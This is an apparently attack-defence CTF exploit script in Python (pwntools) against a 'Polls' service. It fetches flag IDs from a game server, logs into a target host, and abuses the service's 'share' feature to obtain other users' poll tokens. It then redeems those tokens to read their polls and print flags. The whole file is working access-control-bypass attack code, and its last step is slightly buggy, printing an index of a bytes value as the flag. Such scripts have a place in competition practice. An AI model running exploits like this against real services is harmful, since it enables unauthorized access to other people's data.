#!/usr/bin/env python3

from pwn import remote 
import sys 
import json  
import requests

def createUser():
    r.sendline("register")
    r.recvuntil("username:")
    r.sendline("CookieMan")
    r.recvuntil("password:")
    r.sendline("Cookie")
    r.recvuntil("exit]:")

User = 0
ip = "10.60.81.1"
#ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=Polls&team={ip}") 
data = json.loads(response.text)
us = data["Polls"]
us = us[ip]


# Connect to the server
r = remote(ip, 5000)

r.recvuntil("exit]:")
if (User == 1):
    createUser()
r.sendline("login")
r.recvuntil("username:")
r.sendline("CookieMan")
r.recvuntil("password:")
r.sendline("Cookie")
r.recvuntil("exit]:")
for i in us:
    data = json.loads(i)
    poll_id = data['poll_id']
    print(poll_id)
    r.sendline("access poll")
    r.recvuntil("(back):")
    r.sendline("share")
    r.recvuntil("id:")
    r.sendline(poll_id)
    dump = r.recvuntil("exit]:")
    dump = dump.split(b"poll: ")
    print(dump)
    dump = dump[1]
    r.sendline("use token")
    r.recvuntil("Token:")
    r.sendline(dump)
    r.recvuntil("exit]:")
    r.sendline("access poll")
    dump2 = r.recvuntil("(back):")
    r.sendline("access poll")
    r.recvuntil("(back):")
    r.sendline("show")
    flag = dump[1]
    print(flag, flush=True)

r.close()